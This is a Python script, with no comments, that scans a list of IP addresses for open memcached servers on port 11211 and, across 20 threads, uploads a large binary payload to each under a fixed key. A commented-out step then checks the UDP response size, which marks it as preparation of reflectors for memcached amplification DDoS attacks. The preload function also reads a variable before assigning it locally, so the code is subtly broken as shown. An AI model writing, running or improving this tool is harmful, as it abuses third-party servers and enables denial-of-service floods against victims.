from socket import *
import sys
from threading import Thread

data=open("data2.png","rb").read()

def multitask(func,l,thread):
	for i in range(thread):
		li=l[i*(len(l)//thread):(i+1)*(len(l)//thread)]
		Thread(target=func,args=(li,)).start()
	Thread(target=func,args=(l[-(len(l)%thread):],)).start()
def test(ip):
	try:
		s = socket(AF_INET,SOCK_STREAM)
		s.connect_ex((ip,11211))
		s.send("get a\r\n".encode())
		r=str(s.recv(1024))
		open("life-3.txt","a").write(ip)
	except Exception as e:
		r = e
	s.close()
	return str(r)

def preload(ip):
	a=1
	while(a):
		try:
			s = socket(AF_INET,SOCK_STREAM)
			s.settimeout(8)
			print(ip[:-1])
			s.connect((ip,11211))
			data = ("set abc 0 0 %s\r\n"%len(data)).encode()+data+"\r\n".encode()
			print("connect")
			s.send(data)
			r=str(s.recv(64)[:-2].decode())
			print(r)
			a = 0
			open("ok.txt","a").write(ip)
		except BrokenPipeError:
			print(".")
		except Exception as e:
			print(e)
			open("none.txt","a").write(ip)
			a = 0
		s.close()
	sys.stdout.write("\r\n")
def more(l):
	for i in l:
		preload(i)
def mksure(ip):
	try:
		s = socket(AF_INET,SOCK_DGRAM)
		s.sendto("get abc\r\n".encode(),(ip,11211))
		r=len(str(s.recvfrom(1024)[0]))
	except Exception as e:
		r = e
	s.close()
	return str(r)
	

if __name__ == "__main__":
	"""
	with open("memcache.txt","r") as f:
		for i in f.readlines():
			print(i+" "+test(i))
	"""
	ip_set = set(open("gen.txt","r").readlines())-set(open("memcache.txt","r").readlines()+open("ok.txt").readlines()+open("none.txt").readlines())
	print(len(ip_set))
	data=open("data2.png","rb").read()
	multitask(more,(list(ip_set)),20)
	"""
	for i in ip_set:
		preload(i[:],open("data2.png","rb").read())
	for i in open("ok.txt").readlines():
		print(mksure(i))
	"""
	#multitask(print,list(range(5)),3)
